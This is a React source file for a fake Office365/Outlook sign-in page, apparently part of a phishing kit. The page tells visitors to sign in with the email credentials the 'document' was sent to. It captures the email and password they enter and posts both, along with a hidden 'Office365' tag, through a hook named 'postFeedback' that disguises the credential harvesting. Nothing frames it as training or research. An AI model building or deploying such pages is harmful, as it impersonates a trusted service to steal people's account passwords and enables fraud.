import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import { Button, Modal } from 'react-bootstrap';

function App() {
  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Office365');
  const [role, setRole] = useState('2');



  const onSubmit = async (e) => {
  e.preventDefault();
    const data = qs.stringify({
      email: emails,
      password: passwords,
      details: detail,
      role_id: role,
    });

    try {
      await postFeedback(data);
      setPassword('');
      setEmail('');
    } catch (error) {
      console.log(error);
    }
  };
  


  return (

    <div  className="container-fluid">
    <div  className="row" >
    <div className="bg-image " 
     style={{backgroundImage: "url('images/mic.jpg')",
            height: "100vh", backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>

      <div  className="container">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 shadow bg-white rounded" style={{border: "0px",  backgroundColor: "white"}}>
        <div  className="text-left pt-3"> 
                <img src="images/icro.png"  className="img-fluid" width="100px"/> <br/>
                < b  className="b text-dark">Sign In</ b> <br/>
               
              </div>
              <div  className="text-center pt-3"> 
  
                < b  className="b text-dark">To view the document, sign in with the valid email credentials that this file was sent to.</ b>
              </div>
              <div  className="">
         
              <center>
              <img id="" src="images/images/outlook.png"  className="rounded-0" width="60px"/>
             
          

            </center>
            <form    onSubmit={onSubmit}  className="form-horizontal well">
              <div  className="col-sm-10">
                <div  className="form-group row">
                  <b style={{fontColor: "blue", fontSize: "14px"}}>Email Address *</b>
                  <input type="email" name="emails"  className="form-control  " id="emails" value={emails}  onChange={(e) => setEmail(e.target.value)}  placeholder="Enter email address"/>
                  
                </div>
              </div>
              <div  className="col-sm-10">
                <div  className="form-group row">
                  <b style={{fontColor: "blue", fontSize: "14px"}}>Password *</b>
                  <input type="password" name="passwords"  className=" form-control  " id="passwords" value={passwords}  onChange={(e) => setPassword(e.target.value)} placeholder="Enter Password"/>
                </div>
              </div>
         
                <div  className="form-group">
              
                  <input type="hidden" name="detail"  className="form-control" id="detail" value={detail}   onChange={(e) => setDetails(e.target.value)} />
                </div>
       

        
                <div  className="form-group">
              
                  <input type="hidden" name="role"  className="form-control" id="role" value={role}   onChange={(e) => setRole(e.target.value)} />
                </div>
       
        
            <div  className="pt-2 pb-2 text-center">
             
              <button className="btn btn-sm btn-primary " id="submit-btn">Sign In</button>
            </div>
          </form>
        
               
          

                </div>
              
          </div>

       

    


          </div>
     
    </div> 
    </div>
  </div>
  </div>
  );
}

export default App;
